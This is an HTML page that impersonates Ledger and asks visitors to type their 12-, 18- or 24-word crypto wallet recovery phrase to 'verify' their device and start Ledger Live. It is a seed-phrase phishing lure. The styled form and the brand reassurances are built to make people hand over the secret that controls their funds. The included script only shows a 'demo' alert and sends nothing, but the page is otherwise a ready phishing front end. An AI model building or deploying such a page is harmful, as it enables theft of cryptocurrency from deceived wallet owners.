<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verify Seed Phrase</title>
  <style>
    body {
      font-family: "Courier New", monospace;
      background-color: #111;
      color: white;
      margin: 0;
      padding: 40px;
    }

    h1 {
      font-size: 28px;
      letter-spacing: 2px;
    }

    p {
      color: #ccc;
      font-size: 15px;
      margin-top: 10px;
    }

    .btn-group {
      margin-top: 25px;
    }

    .btn-group button {
      background-color: #2a2a2a;
      border: none;
      color: white;
      padding: 10px 25px;
      margin-right: 10px;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
      transition: all 0.2s ease;
    }

    .btn-group button.active {
      background-color: #6f42c1;
      color: white;
    }

    .input-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 15px;
      margin-top: 30px;
      max-width: 1000px;
    }

    .input-grid input {
      background-color: #1c1c1c;
      border: none;
      border-radius: 6px;
      padding: 12px;
      color: white;
      font-size: 16px;
      text-align: left;
    }

    .input-grid input::placeholder {
      color: #777;
    }

    .continue-btn {
      margin-top: 40px;
    }

    .continue-btn button {
      background-color: white;
      color: black;
      padding: 10px 30px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      font-weight: bold;
      transition: 0.2s;
    }

    .continue-btn button:hover {
      background-color: #ccc;
    }
  </style>
</head>
<body>

  <h1>VERIFY SEED PHRASE OF YOUR DEVICE</h1>
  <p>Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.</p>
  <p>**Ledger does not keep a copy of your recovery phrase.</p>
  <p>**ENTER SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.</p>

  <div class="btn-group">
    <button id="btn12" class="active">12 Words</button>
    <button id="btn18">18 Words</button>
    <button id="btn24">24 Words</button>
  </div>

  <div class="input-grid" id="inputs"></div>

  <div class="continue-btn">
    <button id="continueBtn">Continue...</button>
  </div>

  <script>
    const buttons = document.querySelectorAll('.btn-group button');
    const inputContainer = document.getElementById('inputs');
    const continueBtn = document.getElementById('continueBtn');

    // Function to create input fields
    function createInputs(count) {
      inputContainer.innerHTML = '';
      for (let i = 1; i <= count; i++) {
        const input = document.createElement('input');
        input.type = 'text';
        input.placeholder = i;
        inputContainer.appendChild(input);
      }
    }

    // Default load (12 words)
    createInputs(12);

    // Button click actions
    buttons.forEach(button => {
      button.addEventListener('click', () => {
        buttons.forEach(b => b.classList.remove('active'));
        button.classList.add('active');
        const count = parseInt(button.textContent);
        createInputs(count);
      });
    });

    // Continue button action
    continueBtn.addEventListener('click', () => {
      alert("Seed phrase verified successfully (demo).");
    });
  </script>

</body>
</html>
